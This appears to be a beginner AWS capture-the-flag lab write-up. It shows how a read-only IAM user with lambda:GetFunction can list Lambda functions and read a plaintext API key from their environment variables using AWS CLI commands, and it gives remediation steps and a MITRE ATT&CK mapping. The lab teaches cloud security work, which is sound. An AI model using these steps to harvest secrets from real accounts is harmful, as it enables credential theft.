# Lambda Environment Variable Secret Exposure

**Difficulty:** Beginner | **Provider:** AWS | **Category:** Serverless / Credential Exposure

## Scenario

A developer stored a production API key directly in a Lambda function's **environment variables**
instead of using AWS Secrets Manager or Parameter Store. An "auditor" IAM user was granted
`lambda:GetFunction` as part of a read-only policy. This action returns the full function
configuration — including all environment variables — in plaintext, regardless of whether the
variables were marked sensitive in the IaC.

## Attack Path

```
[Attacker] auditor-<id> (lambda:ListFunctions + lambda:GetFunction)
    |
    v
aws lambda list-functions  -->  find cumulonimbus-api-processor-<id>
    |
    v
aws lambda get-function-configuration  -->  Configuration.Environment.Variables
    |
    v
SECRET_API_KEY  -->  flag
```

### Step 1 — Configure the attacker profile

```bash
aws configure --profile attacker
# Enter the provided Access Key ID and Secret Access Key
# Region: eu-west-1
```

### Step 2 — Discover the function

```bash
aws lambda list-functions --profile attacker \
  --query "Functions[?contains(FunctionName,'cumulonimbus')].FunctionName" \
  --output text
```

### Step 3 — Read the environment variables

```bash
aws lambda get-function-configuration \
  --function-name <function_name> \
  --profile attacker \
  --query "Environment.Variables"
```

## How to Fix in Production

1. **Store secrets in AWS Secrets Manager or Parameter Store** — never in Lambda environment variables.
2. **Restrict `lambda:GetFunction`** — this action grants access to the full configuration including env vars; treat it as sensitive.
3. **Use Lambda's native Secrets Manager integration** — inject secrets at runtime without them ever appearing in the configuration API response.
4. **Rotate immediately** if a key has been stored in env vars — treat it as compromised.
5. **Enable AWS Config rule `lambda-function-public-access-prohibited`** and add SCPs to prevent lambda:GetFunction for non-privileged identities.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | T1552.001 |
| Cloud Infrastructure Discovery | T1580 |
| Valid Accounts: Cloud Accounts | T1078.004 |
